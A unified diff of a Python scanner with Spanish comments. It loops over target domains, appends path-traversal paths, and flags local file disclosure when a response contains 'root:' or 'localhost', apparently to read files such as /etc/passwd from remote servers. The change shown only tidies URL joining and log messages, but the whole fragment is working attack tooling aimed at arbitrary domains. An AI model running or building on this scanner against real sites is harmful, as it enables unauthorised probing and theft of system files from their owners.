@@ -51,11 +51,14 @@ for domain in domains:
     print(f"\n--- Probando en el dominio: {domain} ---")
     for path in traversal_paths:
         try:
-            response = requests.get(domain + path, headers=headers, timeout=args.timeout)
+            # Combinar la URL base con la ruta, asegurando que haya una sola barra
+            full_url = f"{domain.rstrip('/')}/{path.lstrip('/')}"
+            response = requests.get(full_url, headers=headers, timeout=args.timeout)
+
             # Verificación básica de éxito en LFD
             if "root:" in response.text or "localhost" in response.text:
-                print(Colores.VERDE + f"[+] Posible LFD encontrado en {domain} con el path {path}:\n{response.text[:200]}" + Colores.RESET)  # Limita a 200 caracteres
+                print(Colores.VERDE + f"[+] Posible LFD encontrado en {full_url}:\n{response.text[:200]}" + Colores.RESET)  # Limita a 200 caracteres
             else:
                 print(Colores.ROJO + f"[-] No vulnerable con el path {path}" + Colores.RESET)
         except requests.RequestException as e:
-            print(Colores.AMARILLO + f"[!] Error al acceder a {domain} con el path {path}: {e}" + Colores.RESET)
+            print(Colores.AMARILLO + f"[!] Error al acceder a {full_url}: {e}" + Colores.RESET)
